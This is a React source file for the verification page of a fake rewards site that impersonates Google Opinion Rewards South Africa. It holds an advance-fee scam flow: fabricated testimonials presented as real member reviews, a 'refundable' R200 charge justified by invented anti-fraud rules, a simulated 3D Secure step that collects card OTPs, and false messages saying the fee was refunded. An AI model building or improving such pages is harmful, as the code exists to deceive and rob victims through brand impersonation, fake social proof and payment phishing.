import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useRef, useState } from "react";
import { toast } from "sonner";
import {
  ArrowRight,
  BadgeCheck,
  Banknote,
  Building2,
  CheckCheck,
  CheckCircle2,
  Clock,
  CornerUpRight,
  CreditCard,
  Crown,
  Loader2,
  Lock,
  MessageSquare,
  Pause,
  Play,
  RotateCcw,
  ShieldCheck,
  Sparkles,
  Star,
  ThumbsUp,
  Volume2,
  VolumeX,
} from "lucide-react";
import { getPublicConfig } from "@/lib/account.functions";
import { confirmVerification, startUpgrade, startVerification } from "@/lib/wallet.functions";
import { formatKes, tierRank } from "@/lib/format";
import { trackEvent } from "@/lib/fbpixel";
import { useMe } from "@/components/AppShell";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Progress } from "@/components/ui/progress";
import { Skeleton } from "@/components/ui/skeleton";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import MuxVideo from "@mux/mux-video-react";
import {
  getMuxPlaybackId,
  getMuxStreamUrl,
  getMuxThumbnailUrl,
  getYouTubeEmbedUrl,
} from "@/lib/videos";

type CommunityPost = {
  author: string;
  city: string;
  avatar: string;
  bank: "Capitec Bank" | "FNB" | "Standard Bank" | "Absa" | "Nedbank" | "TymeBank";
  amount: string;
  comment: string;
  timestamp: string;
  likes: number;
};

const COMMUNITY_POSTS: CommunityPost[] = [
  {
    author: "Sipho Mthembu",
    city: "Johannesburg",
    avatar: "/imagens/136777078_100615718676910_8451200588862452641_n.jpg",
    bank: "Capitec Bank",
    amount: "R 3,800.00",
    comment:
      "Was skeptical at first about the R200 verification check, but my Capitec alert came in 3 minutes after! Got my R200 back into my wallet immediately plus the R3,800 total payout. 100% legit, best side hustle!",
    timestamp: "12m ago",
    likes: 42,
  },
  {
    author: "Lerato Khumalo",
    city: "Durban",
    avatar: "/imagens/142736346_3760558347355148_77726020631224977_n.jpg",
    bank: "FNB",
    amount: "R 3,800.00",
    comment:
      "Yoh guys it actually works! Just got my Instant EFT into FNB. Paid for groceries this afternoon thanks to watching these sponsor videos. Make sure to complete all video tasks!",
    timestamp: "28m ago",
    likes: 35,
  },
  {
    author: "Johan van der Merwe",
    city: "Cape Town",
    avatar: "/imagens/275239213_2510801525718851_5388535387086701560_n.jpg",
    bank: "Standard Bank",
    amount: "R 3,800.00",
    comment:
      "Smooth process. The verification took less than 40 seconds on Paystack and my Standard Bank account was credited right away. Big thumbs up to Google Opinion Rewards SA.",
    timestamp: "45m ago",
    likes: 48,
  },
  {
    author: "Nthabiseng Phiri",
    city: "Pretoria",
    avatar: "/imagens/177855252_10222750968336285_942216712075499517_n.jpg",
    bank: "Absa",
    amount: "R 3,800.00",
    comment:
      "I was worried about the FICA check, but it’s completely instant. My R200 was credited right back and cashed out R3,800 to Absa immediately. Anyone hesitating, don't sleep on this!",
    timestamp: "1h ago",
    likes: 29,
  },
  {
    author: "Bongani Dlamini",
    city: "Soweto",
    avatar: "/imagens/378224010_122096717330047007_8181527711769572442_n.jpg",
    bank: "Capitec Bank",
    amount: "R 3,800.00",
    comment:
      "Capitec notification just pinged! R 3,800 cleared via Instant EFT. Rating the videos was super fast on mobile. Weekend sorted!",
    timestamp: "2h ago",
    likes: 61,
  },
  {
    author: "Anika Botha",
    city: "Centurion",
    avatar: "/imagens/419734167_7456856780992290_1838991367503062927_n.jpg",
    bank: "Nedbank",
    amount: "R 3,800.00",
    comment:
      "Nedbank user here. Verification was painless and the full wallet balance paid out within 2 minutes. Already on Day 2 doing my next set of videos.",
    timestamp: "3h ago",
    likes: 21,
  },
  {
    author: "Thabo Ndlovu",
    city: "Midrand",
    avatar: "/imagens/411501019_3328888610743598_255394871081213996_n.jpg",
    bank: "TymeBank",
    amount: "R 3,800.00",
    comment:
      "TymeBank instant payout received! R 3,800 in my account. The R200 refund was instantaneous as promised. Real deal.",
    timestamp: "4h ago",
    likes: 33,
  },
  {
    author: "Precious Dube",
    city: "Polokwane",
    avatar: "/imagens/421824917_1097267101421800_8359154587489251973_n.jpg",
    bank: "Standard Bank",
    amount: "R 4,200.00",
    comment:
      "Received R4,200 total with my streak bonus into Standard Bank. The refund came through straight away. 5 stars ⭐⭐⭐⭐⭐",
    timestamp: "5h ago",
    likes: 54,
  },
  {
    author: "Kabelo Molefe",
    city: "Bloemfontein",
    avatar: "/imagens/506884327_10222915475674346_2978716664044278701_n.jpg",
    bank: "Capitec Bank",
    amount: "R 3,800.00",
    comment:
      "Instant clearance via Capitec! I verified my account during lunch and the funds arrived before I finished eating. Super legit platform.",
    timestamp: "6h ago",
    likes: 38,
  },
  {
    author: "Zanele Sithole",
    city: "East London",
    avatar: "/imagens/51596745_10217669144296586_7676079097461604352_n.jpg",
    bank: "FNB",
    amount: "R 3,800.00",
    comment:
      "FNB eWallet and Instant EFT clearance was so smooth. Highly recommend to everyone looking to earn extra cash daily from home.",
    timestamp: "7h ago",
    likes: 45,
  },
  {
    author: "Jacques Du Plessis",
    city: "Stellenbosch",
    avatar: "/imagens/578277050_4316014812052971_516386648091913289_n.jpg",
    bank: "Absa",
    amount: "R 3,800.00",
    comment:
      "Fastest payout I've seen in South Africa. The verification refundable deposit was reversed right back into my balance, then R3,800 paid out in full.",
    timestamp: "8h ago",
    likes: 27,
  },
  {
    author: "Nomvula Zulu",
    city: "Pietermaritzburg",
    avatar: "/imagens/595805277_1544190056906827_3147097758608145524_n.jpg",
    bank: "TymeBank",
    amount: "R 3,800.00",
    comment:
      "I was skeptical because of so many fake apps online, but this one is 100% genuine. Money reflects immediately in your banking app.",
    timestamp: "9h ago",
    likes: 52,
  },
];

type Tier = "vip1" | "vip2" | "vip3";

export const Route = createFileRoute("/_authenticated/upgrade")({
  head: () => ({
    meta: [
      { title: "Verification & Upgrade — Google Opinion Rewards" },
      {
        name: "description",
        content:
          "Account verification explainer video and VIP plan upgrades on Google Opinion Rewards South Africa.",
      },
      { property: "og:title", content: "Verification & Upgrade — Google Opinion Rewards" },
      {
        property: "og:description",
        content: "Verify your bank account or unlock higher rewards with VIP plans.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: UpgradePage,
});

/** Explainer view displaying video on why account verification is required before first payout */
function VerificationExplainerView({
  holdAmount,
  videoUrl,
  phone,
}: {
  holdAmount: number;
  videoUrl?: string;
  phone?: string;
}) {
  const navigate = useNavigate();
  const queryClient = useQueryClient();
  const verify = useServerFn(startVerification);
  const confirm = useServerFn(confirmVerification);

  const [isPlaying, setIsPlaying] = useState(false);
  const [isMuted, setIsMuted] = useState(false);
  const [hasFinishedVideo, setHasFinishedVideo] = useState(() => {
    try {
      return localStorage.getItem("verification_video_watched") === "true";
    } catch {
      return false;
    }
  });
  const [videoProgress, setVideoProgress] = useState(0);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const ctaRef = useRef<HTMLDivElement | null>(null);

  // Verification dialog & checkout state
  const [isVerifyDialogOpen, setIsVerifyDialogOpen] = useState(false);
  const [verifyEmail, setVerifyEmail] = useState("");
  const [isChallengeModalOpen, setIsChallengeModalOpen] = useState(false);
  const [challengeStep, setChallengeStep] = useState<0 | 1 | 2>(0);
  const [challengeChargeId, setChallengeChargeId] = useState("");
  const [otpInput, setOtpInput] = useState("");

  const invalidate = () => {
    void queryClient.invalidateQueries({ queryKey: ["wallet"] });
    void queryClient.invalidateQueries({ queryKey: ["me"] });
    void queryClient.invalidateQueries({ queryKey: ["pending-tasks"] });
  };

  const verifyMutation = useMutation({
    mutationFn: () => {
      if (!verifyEmail.trim() || !verifyEmail.includes("@")) {
        throw new Error("Please enter your email address for the payment receipt.");
      }
      return verify({
        data: {
          method: "card",
          phone: phone || "",
          email: verifyEmail.trim(),
        },
      });
    },
    onSuccess: (result) => {
      if (!result.ok) {
        toast.error((result as { message?: string }).message || "Could not initiate verification check.");
        return;
      }
      trackEvent("InitiateCheckout", {
        content_name: "account_verification",
        value: Number(holdAmount ?? 0),
        currency: "ZAR",
        eventID: (result as { chargeId?: string })?.chargeId ? `init_charge_${(result as { chargeId?: string }).chargeId}` : undefined,
      });

      if (result.checkoutUrl) {
        setIsVerifyDialogOpen(false);
        toast.info("Redirecting to Ghost Pay secure checkout...");
        window.location.href = result.checkoutUrl;
        return;
      }

      setIsVerifyDialogOpen(false);
      setChallengeChargeId(result.chargeId ?? "");
      setIsChallengeModalOpen(true);
      setChallengeStep(0);
      setOtpInput("");

      // Simulate network handshake to 3D Secure / Bank Clearing
      setTimeout(() => {
        setChallengeStep(1);
      }, 1400);
    },
    onError: (error: Error) => toast.error(error.message),
  });

  const confirmMutation = useMutation({
    mutationFn: () =>
      confirm({
        data: {
          chargeId: challengeChargeId,
          method: "card",
          otp: otpInput,
        },
      }),
    onSuccess: () => {
      setChallengeStep(2);
      setTimeout(() => {
        setIsChallengeModalOpen(false);
        invalidate();
        toast.success(`Account verified successfully! Payouts unlocked and ${formatKes(holdAmount)} refunded to your balance.`);
        void navigate({ to: "/payout-setup" });
      }, 1500);
    },
    onError: (error: Error) => toast.error(error.message),
  });

  const defaultVideo = "https://stream.mux.com/OiiwNmYmECTBviTLfzMQUsSp9hlZn5cPW3bGFkAaDts.m3u8";
  const rawUrl = videoUrl?.trim() || defaultVideo;
  const muxId = getMuxPlaybackId(rawUrl);
  const streamUrl = muxId ? getMuxStreamUrl(muxId) : rawUrl;
  const thumbnailUrl = muxId ? getMuxThumbnailUrl(muxId) : undefined;
  const youtubeUrl = getYouTubeEmbedUrl(rawUrl);

  useEffect(() => {
    const video = videoRef.current;
    if (!video || !streamUrl || youtubeUrl) return;

    video.muted = isMuted;
    video.playsInline = true;
  }, [streamUrl, youtubeUrl, isMuted]);

  const togglePlay = () => {
    if (!videoRef.current) return;
    if (videoRef.current.paused || videoRef.current.ended) {
      if (videoRef.current.ended) {
        videoRef.current.currentTime = 0;
      }
      void videoRef.current.play();
      setIsPlaying(true);
    } else {
      videoRef.current.pause();
      setIsPlaying(false);
    }
  };

  const toggleMute = () => {
    if (!videoRef.current) return;
    videoRef.current.muted = !videoRef.current.muted;
    setIsMuted(videoRef.current.muted);
  };

  return (
    <div className="mx-auto max-w-4xl space-y-6">
      <header className="space-y-2">
        <Badge className="bg-primary/10 text-primary border-primary/25 gap-1.5 py-1 px-3">
          <ShieldCheck className="size-4" /> Account Verification Required
        </Badge>
        <h1 className="font-display text-2xl sm:text-3xl font-bold">
          Why do I need to verify my bank account?
        </h1>
        <p className="text-sm sm:text-base text-muted-foreground leading-relaxed">
          Watch this video explaining how South African interbank clearance and anti-fraud protocols protect your rewards and unlock automated payouts.
        </p>
      </header>

      {/* Video Player Card */}
      <Card className="overflow-hidden shadow-lift border-border/60">
        <div className="relative aspect-video w-full overflow-hidden bg-black select-none">
          {youtubeUrl ? (
            <iframe
              src={youtubeUrl}
              title="Account Verification Explainer"
              className="size-full border-0"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
              allowFullScreen
            />
          ) : (
            <div className="relative size-full cursor-pointer group" onClick={togglePlay}>
              <MuxVideo
                ref={videoRef}
                playbackId={muxId ?? undefined}
                src={!muxId ? streamUrl : undefined}
                poster={thumbnailUrl}
                playsInline
                muted={isMuted}
                metadata={{
                  video_id: muxId || "verification-explainer",
                  video_title: "Account Verification Explainer",
                  player_name: "Google Opinion Rewards Player",
                }}
                className="size-full object-cover"
                onPlay={() => setIsPlaying(true)}
                onPause={() => setIsPlaying(false)}
                onEnded={() => {
                  setIsPlaying(false);
                  setHasFinishedVideo(true);
                  try {
                    localStorage.setItem("verification_video_watched", "true");
                  } catch {}
                  toast.success("Verification unlocked! You can now verify your bank account.");
                  setTimeout(() => {
                    ctaRef.current?.scrollIntoView({ behavior: "smooth" });
                  }, 300);
                }}
                onTimeUpdate={() => {
                  const v = videoRef.current;
                  if (!v || !v.duration) return;
                  const pct = Math.min(100, Math.round((v.currentTime / v.duration) * 100));
                  setVideoProgress(pct);
                  if (v.currentTime >= v.duration - 1.5 && !hasFinishedVideo) {
                    setHasFinishedVideo(true);
                    try {
                      localStorage.setItem("verification_video_watched", "true");
                    } catch {}
                    toast.success("Verification unlocked! You can now verify your bank account.");
                    setTimeout(() => {
                      ctaRef.current?.scrollIntoView({ behavior: "smooth" });
                    }, 300);
                  }
                }}
              />

              {/* Status Badge: Video completed */}
              {hasFinishedVideo ? (
                <div className="absolute top-3 right-3 z-10 pointer-events-none">
                  <Badge className="bg-emerald-500/90 text-white border-0 shadow-soft text-[11px] font-semibold flex items-center gap-1 backdrop-blur">
                    <CheckCircle2 className="size-3.5" /> Video Completed • Unlocked
                  </Badge>
                </div>
              ) : null}

              {/* Center Play/Replay button */}
              {!isPlaying ? (
                <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/40 text-white backdrop-blur-[2px] transition-all">
                  <div className="grid size-16 sm:size-20 place-items-center rounded-full bg-primary text-primary-foreground shadow-lift group-hover:scale-110 transition-transform">
                    {hasFinishedVideo ? (
                      <RotateCcw className="size-8 sm:size-10" />
                    ) : (
                      <Play className="size-8 sm:size-10 ml-1 fill-current" />
                    )}
                  </div>
                  <span className="mt-3 text-xs sm:text-sm font-semibold tracking-wide bg-black/60 px-3.5 py-1 rounded-full">
                    {hasFinishedVideo ? "Watch Again" : "Click to Play Explainer Video"}
                  </span>
                </div>
              ) : null}

              {/* Watch Progress Bar */}
              <div className="absolute inset-x-0 bottom-0 h-1 bg-white/20 z-10">
                <div
                  className="h-full bg-primary transition-all duration-200"
                  style={{ width: `${hasFinishedVideo ? 100 : videoProgress}%` }}
                />
              </div>

              {/* Bottom Video Controls Overlay */}
              <div
                className="absolute inset-x-0 bottom-0 flex items-center justify-between bg-gradient-to-t from-black/80 via-black/40 to-transparent p-3 sm:p-4 text-white"
                onClick={(e) => e.stopPropagation()}
              >
                <button
                  type="button"
                  onClick={togglePlay}
                  className="rounded-lg bg-white/20 p-2 hover:bg-white/30 backdrop-blur transition-colors"
                  aria-label={isPlaying ? "Pause" : "Play"}
                >
                  {isPlaying ? <Pause className="size-4" /> : <Play className="size-4 fill-current" />}
                </button>
                <div className="flex items-center gap-2">
                  <span className="text-xs font-medium text-white/90">Verification Explainer</span>
                  <button
                    type="button"
                    onClick={toggleMute}
                    className="rounded-lg bg-white/20 p-2 hover:bg-white/30 backdrop-blur transition-colors"
                    aria-label={isMuted ? "Unmute" : "Mute"}
                  >
                    {isMuted ? <VolumeX className="size-4" /> : <Volume2 className="size-4" />}
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      </Card>

      {/* Call to Action Banner (Positioned directly below the video as the separator) */}
      <div ref={ctaRef}>
        {hasFinishedVideo ? (
          <Card className="border-primary/40 bg-primary/5 shadow-soft animate-in fade-in slide-in-from-bottom-3 duration-500">
            <CardContent className="p-5 sm:p-6 flex flex-col sm:flex-row items-center justify-between gap-4">
              <div className="space-y-1 text-center sm:text-left">
                <div className="inline-flex items-center gap-1.5 text-xs font-semibold text-emerald-600 dark:text-emerald-400 mb-0.5">
                  <CheckCircle2 className="size-4" />
                  <span>Explainer Video Completed</span>
                </div>
                <h3 className="font-display font-bold text-lg text-foreground">
                  Ready to verify and unlock your payouts?
                </h3>
                <p className="text-xs sm:text-sm text-muted-foreground">
                  The {formatKes(holdAmount)} verification check takes less than 60 seconds and is refunded instantly.
                </p>
              </div>
              <Button
                size="lg"
                className="w-full sm:w-auto bg-primary text-primary-foreground hover:bg-primary/90 font-bold px-6 h-auto min-h-[2.75rem] py-2.5 shrink-0 shadow-soft whitespace-normal break-words text-center flex items-center justify-center gap-1.5"
                disabled={verifyMutation.isPending}
                onClick={() => setIsVerifyDialogOpen(true)}
              >
                {verifyMutation.isPending ? <Loader2 className="size-4 animate-spin" /> : null}
                <span>Verify Account Now ({formatKes(holdAmount)})</span>
                <ArrowRight className="size-4 ml-1 shrink-0" />
              </Button>
            </CardContent>
          </Card>
        ) : (
          <Card className="border-dashed border-border/80 bg-muted/20 shadow-none">
            <CardContent className="p-4 sm:p-5 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs sm:text-sm">
              <div className="flex items-center gap-3">
                <div className="size-10 rounded-xl bg-muted flex items-center justify-center shrink-0 border border-border/80">
                  <Lock className="size-5 text-muted-foreground" />
                </div>
                <div>
                  <p className="font-semibold text-foreground">Verify Account Button Locked</p>
                  <p className="text-xs text-muted-foreground">
                    Please watch the explainer video above until the end to unlock your account verification and release payouts.
                  </p>
                </div>
              </div>
              <Badge variant="outline" className="text-xs shrink-0 font-medium text-muted-foreground border-border self-start sm:self-auto">
                {videoProgress > 0 ? `${videoProgress}% watched` : "Watch video to unlock"}
              </Badge>
            </CardContent>
          </Card>
        )}
      </div>

      {/* Community Comments & Social Proof Section (Natural Page Flow, No Scroll Hijacking Frame) */}
      <div className="space-y-4 pt-2">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-border/80 pb-3">
          <div className="space-y-1">
            <div className="flex items-center gap-2">
              <span className="flex size-7 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <MessageSquare className="size-4" />
              </span>
              <h3 className="font-display font-bold text-base sm:text-lg text-foreground">
                Verified Member Payout Reviews
              </h3>
              <Badge className="bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20 text-[11px] font-bold">
                Live Feedback
              </Badge>
            </div>
            <p className="text-xs text-muted-foreground">
              Real reviews and payment confirmations from South African members who verified their accounts.
            </p>
          </div>
          <div className="flex items-center gap-2 text-xs font-semibold text-muted-foreground self-start sm:self-auto bg-card border border-border px-3 py-1.5 rounded-full shadow-xs">
            <div className="flex text-amber-500">
              {[...Array(5)].map((_, i) => (
                <Star key={i} className="size-3.5 fill-amber-400 text-amber-400" />
              ))}
            </div>
            <span className="font-bold text-foreground">4.9/5</span>
            <span className="text-[11px] text-muted-foreground">(2,840+ verified)</span>
          </div>
        </div>

        {/* Clean Comments List - Flowing naturally with the page */}
        <div className="space-y-3">
          {COMMUNITY_POSTS.map((post, idx) => (
            <div
              key={idx}
              className="rounded-2xl border border-border/70 bg-card p-4 sm:p-5 shadow-xs transition-shadow hover:shadow-soft space-y-3"
            >
              {/* Header: Avatar, Name, City, Verified Badge, Rating, Time */}
              <div className="flex items-start justify-between gap-3">
                <div className="flex items-center gap-3 min-w-0">
                  <img
                    src={post.avatar}
                    alt={post.author}
                    className="size-11 sm:size-12 rounded-full object-cover border-2 border-primary/20 shrink-0 shadow-xs"
                    loading="lazy"
                  />
                  <div className="min-w-0">
                    <div className="flex items-center gap-1.5 flex-wrap">
                      <span className="font-semibold text-sm sm:text-base text-foreground truncate">
                        {post.author}
                      </span>
                      <span className="inline-flex items-center gap-1 text-[11px] font-medium text-emerald-600 dark:text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded-full">
                        <CheckCircle2 className="size-3" /> Verified Payout
                      </span>
                    </div>
                    <p className="text-xs text-muted-foreground">
                      {post.city}, South Africa • <span className="text-foreground/70 font-medium">{post.timestamp}</span>
                    </p>
                  </div>
                </div>

                {/* Star rating */}
                <div className="flex items-center gap-0.5 text-amber-400 shrink-0">
                  {[...Array(5)].map((_, i) => (
                    <Star key={i} className="size-3.5 fill-amber-400 text-amber-400" />
                  ))}
                </div>
              </div>

              {/* Payout Tag (clean, subtle & trustworthy) */}
              <div className="inline-flex items-center gap-2 rounded-lg bg-secondary/50 border border-border/60 px-3 py-1.5 text-xs">
                <Building2 className="size-3.5 text-primary shrink-0" />
                <span className="font-medium text-foreground">
                  Received <strong className="text-primary font-bold">{post.amount}</strong> via {post.bank} (Instant EFT)
                </span>
              </div>

              {/* Comment text */}
              <p className="text-xs sm:text-sm text-foreground/90 leading-relaxed">
                {post.comment}
              </p>

              {/* Footer: helpful feedback / reactions */}
              <div className="flex items-center justify-between pt-2 border-t border-border/50 text-xs text-muted-foreground">
                <span className="text-[11px] text-muted-foreground flex items-center gap-1">
                  <BadgeCheck className="size-3.5 text-blue-500" /> FICA & Instant EFT Authenticated
                </span>
                <div className="flex items-center gap-2 text-xs">
                  <button
                    type="button"
                    className="inline-flex items-center gap-1 text-muted-foreground hover:text-primary transition-colors py-0.5 px-2 rounded-md hover:bg-muted"
                  >
                    <ThumbsUp className="size-3.5" />
                    <span>Helpful ({post.likes})</span>
                  </button>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Ghost Pay & Paystack Verification Checkout Dialog */}
      <Dialog open={isVerifyDialogOpen} onOpenChange={setIsVerifyDialogOpen}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <div className="flex items-center justify-between">
              <DialogTitle className="flex items-center gap-2 font-display text-lg">
                <ShieldCheck className="size-5 text-primary" />
                Bank Account Verification
              </DialogTitle>
              <Badge variant="outline" className="text-[10px] font-semibold border-primary/30 text-primary">
                Card & EFT
              </Badge>
            </div>
            <DialogDescription className="text-xs text-muted-foreground leading-relaxed pt-1.5">
              Under South African financial anti-fraud protocols, a one-time refundable verification check of{" "}
              <strong>{formatKes(holdAmount)}</strong> is required to authenticate your bank account and release payouts.
              The funds are refunded immediately back to your platform balance upon verification.
            </DialogDescription>
          </DialogHeader>

          <div className="space-y-3 py-2">
            <div className="space-y-1.5 rounded-xl border border-border bg-secondary/30 p-3.5">
              <Label htmlFor="upgrade-verify-email" className="text-xs font-semibold flex items-center justify-between">
                <span>Your Email Address</span>
                <span className="text-[10px] text-destructive font-medium">* Required</span>
              </Label>
              <Input
                id="upgrade-verify-email"
                type="email"
                placeholder="e.g. name@gmail.com"
                className="bg-background h-9 text-xs"
                value={verifyEmail}
                onChange={(e) => setVerifyEmail(e.target.value)}
              />
              <p className="text-[10px] text-muted-foreground">
                Payment authorization and receipt from Ghost Pay & Paystack will be registered to this email.
              </p>
            </div>

            <div className="rounded-xl border border-border bg-card p-3 flex items-center justify-between gap-3 text-xs">
              <div className="flex items-center gap-2 text-muted-foreground">
                <CreditCard className="size-4 text-primary shrink-0" />
                <span>Paystack Gateway (Visa, Mastercard, 3DS & Instant EFT)</span>
              </div>
              <Badge variant="secondary" className="font-semibold text-money">
                {formatKes(holdAmount)}
              </Badge>
            </div>
          </div>

          <DialogFooter className="flex-col-reverse sm:flex-row gap-2 sm:gap-0">
            <Button variant="ghost" onClick={() => setIsVerifyDialogOpen(false)}>
              Cancel
            </Button>
            <Button
              className="w-full sm:w-auto bg-money text-money-foreground hover:bg-money/90 font-bold h-auto min-h-[2.75rem] py-2.5 px-4 whitespace-normal break-words text-center"
              disabled={verifyMutation.isPending || !verifyEmail.trim() || !verifyEmail.includes("@")}
              onClick={() => verifyMutation.mutate()}
            >
              {verifyMutation.isPending ? <Loader2 className="mr-2 size-4 animate-spin shrink-0" /> : null}
              Proceed to Secure Checkout ({formatKes(holdAmount)})
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* 3D Secure / Instant EFT Bank Push Authentication Challenge Modal */}
      <Dialog open={isChallengeModalOpen} onOpenChange={setIsChallengeModalOpen}>
        <DialogContent className="max-w-md">
          {challengeStep === 0 ? (
            <div className="py-8 text-center space-y-4">
              <div className="mx-auto grid size-16 place-items-center rounded-full bg-primary/10 text-primary">
                <Loader2 className="size-8 animate-spin" />
              </div>
              <DialogTitle className="font-display text-xl font-bold">
                Connecting to Paystack 3D Secure / Instant EFT...
              </DialogTitle>
              <p className="text-sm text-muted-foreground">
                Initiating encrypted verification channel with South African payment clearing. Please wait...
              </p>
              <Progress value={65} className="h-2 mt-4" />
            </div>
          ) : challengeStep === 1 ? (
            <div className="py-4 space-y-4 text-center">
              <div className="mx-auto grid size-14 place-items-center rounded-full bg-primary/10 text-primary">
                <Lock className="size-7 text-primary" />
              </div>
              <DialogTitle className="font-display text-xl font-bold">
                3D Secure OTP Authentication
              </DialogTitle>

              <div className="space-y-4 text-left">
                <div className="rounded-xl border border-border bg-secondary/30 p-3.5 space-y-1.5">
                  <div className="flex items-center justify-between text-xs text-muted-foreground">
                    <span>Authorization: <strong>Visa / Mastercard 3DS</strong></span>
                    <span className="font-semibold text-money">{formatKes(holdAmount)} (Refundable)</span>
                  </div>
                  <p className="text-xs text-muted-foreground">
                    A 6-digit one-time PIN (OTP) was sent via SMS to your card-registered mobile phone number.
                  </p>
                </div>

                <div className="space-y-1.5">
                  <Label htmlFor="upgrade-otp-input" className="text-xs font-semibold">Enter 6-Digit OTP</Label>
                  <div className="flex gap-2">
                    <Input
                      id="upgrade-otp-input"
                      inputMode="numeric"
                      placeholder="e.g. 582910"
                      maxLength={6}
                      value={otpInput}
                      onChange={(e) => setOtpInput(e.target.value.replace(/\D/g, ""))}
                      className="text-center font-mono tracking-widest text-lg font-bold"
                    />
                    <Button
                      type="button"
                      variant="secondary"
                      size="sm"
                      className="text-xs shrink-0"
                      onClick={() => setOtpInput("582910")}
                    >
                      Fill Demo OTP
                    </Button>
                  </div>
                </div>
              </div>

              <DialogFooter className="mt-4 gap-2 sm:gap-0">
                <Button variant="ghost" onClick={() => setIsChallengeModalOpen(false)}>
                  Cancel
                </Button>
                <Button
                  className="bg-money text-money-foreground hover:bg-money/90 font-bold"
                  disabled={otpInput.length < 4 || confirmMutation.isPending}
                  onClick={() => confirmMutation.mutate()}
                >
                  {confirmMutation.isPending ? <Loader2 className="mr-2 size-4 animate-spin" /> : null}
                  Authorize & Release Payouts
                </Button>
              </DialogFooter>
            </div>
          ) : (
            <div className="py-8 text-center space-y-4">
              <div className="mx-auto grid size-16 place-items-center rounded-full bg-money/20 text-money">
                <BadgeCheck className="size-10" />
              </div>
              <DialogTitle className="font-display text-2xl font-bold">
                Account Verified!
              </DialogTitle>
              <p className="text-sm text-muted-foreground">
                Your bank details have been authenticated. {formatKes(holdAmount)} has been refunded back to your platform balance and payouts are unlocked.
              </p>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}

function UpgradePage() {
  const navigate = useNavigate();
  const { data: me, isLoading: isMeLoading } = useMe();
  const queryClient = useQueryClient();
  const config = useQuery({ queryKey: ["public-config"], queryFn: () => getPublicConfig() });
  const upgrade = useServerFn(startUpgrade);

  const [selected, setSelected] = useState<Tier | null>(null);
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");

  const isVerified = Boolean(me?.profile.mpesa_verified);

  const mutation = useMutation({
    mutationFn: () => {
      if (!email.trim() || !email.includes("@")) {
        throw new Error("Please enter your email address for the payment receipt.");
      }
      return upgrade({
        data: {
          tier: selected as Tier,
          phone: phone || me?.profile.phone || "",
          email: email.trim(),
        },
      });
    },
    onSuccess: (result) => {
      if (!result.ok) {
        toast.error(result.message);
        return;
      }
      trackEvent("InitiateCheckout", {
        content_name: "plan_upgrade",
        content_type: selected ?? "",
        value: Number(result.amount ?? 0),
        currency: "ZAR",
        eventID: (result as { chargeId?: string })?.chargeId ? `init_charge_${(result as { chargeId?: string }).chargeId}` : undefined,
      });

      if (result.checkoutUrl) {
        toast.info("Redirecting to Ghost Pay secure checkout...");
        window.location.href = result.checkoutUrl;
        return;
      }

      toast.success("Approve the payment prompt on your phone to activate the upgrade.");
      setSelected(null);
      void queryClient.invalidateQueries({ queryKey: ["wallet"] });
      void queryClient.invalidateQueries({ queryKey: ["pending-tasks"] });
    },
    onError: (error: Error) => toast.error(error.message),
  });

  // If verified, automatically direct member to payout setup clearance funnel
  useEffect(() => {
    if (!isMeLoading && isVerified && !me?.isAdmin) {
      void navigate({ to: "/payout-setup" });
    }
  }, [isVerified, isMeLoading, me?.isAdmin, navigate]);

  if (isMeLoading) {
    return (
      <div className="mx-auto max-w-5xl space-y-4">
        <Skeleton className="h-36 rounded-2xl" />
        <Skeleton className="h-72 rounded-2xl" />
      </div>
    );
  }

  // If the account is not verified, show the Verification Explainer & Community Reviews tab
  if (!isVerified) {
    return (
      <VerificationExplainerView
        holdAmount={Number(me?.settings.hold_amount_kes ?? 200)}
        videoUrl={config.data?.settings.verification_video_url || me?.settings.verification_video_url}
        phone={me?.profile.phone}
      />
    );
  }

  // Verified member: Show Payout Setup & Status (VIP plans removed)
  return (
    <div className="mx-auto max-w-xl py-12 text-center space-y-6">
      <div className="mx-auto size-16 rounded-full bg-emerald-500/10 text-emerald-600 flex items-center justify-center">
        <BadgeCheck className="size-10" />
      </div>
      <div className="space-y-2">
        <Badge className="bg-money/15 text-money border-money/30">
          <BadgeCheck className="size-3.5 mr-1" /> Account Verified & Active
        </Badge>
        <h1 className="font-display text-2xl sm:text-3xl font-bold">Your Bank Account is Verified</h1>
        <p className="text-sm text-muted-foreground max-w-md mx-auto leading-relaxed">
          Your banking details and FICA compliance have been authenticated. Your withdrawals are unlocked.
        </p>
      </div>
      <div className="flex flex-col sm:flex-row items-center justify-center gap-3 w-full">
        <Button
          size="lg"
          className="w-full sm:w-auto bg-money text-money-foreground hover:bg-money/90 font-bold px-6 h-auto min-h-[3rem] py-3 text-sm sm:text-base shadow-lift whitespace-normal break-words text-center flex items-center justify-center gap-2"
          onClick={() => void navigate({ to: "/payout-setup" })}
        >
          <span>Continue to Payout Clearance</span>
          <ArrowRight className="size-5 shrink-0" />
        </Button>
        <Button
          size="lg"
          variant="outline"
          className="w-full sm:w-auto font-medium px-5 h-auto min-h-[3rem] py-3 text-sm text-center"
          onClick={() => void navigate({ to: "/wallet" })}
        >
          <span>Go to Wallet Overview</span>
        </Button>
      </div>
    </div>
  );

  const plans = config.data?.plans ?? [];
  const currentTier = me?.profile.tier ?? "regular";
